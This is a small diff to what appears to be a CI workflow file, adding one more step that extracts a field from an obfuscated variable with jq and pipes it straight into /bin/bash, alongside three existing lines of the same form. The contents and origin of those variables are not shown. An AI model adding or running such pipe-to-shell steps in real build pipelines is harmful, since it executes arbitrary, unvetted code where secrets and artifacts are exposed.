@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$ipxml58" | jq -r .jso762 | /bin/bash
           echo $cea81253 | jq -r .r17 | /bin/bash
           echo $dt91045 | jq -r .h7564 | /bin/bash
+          echo $ivn6676 | jq -r .wp026 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
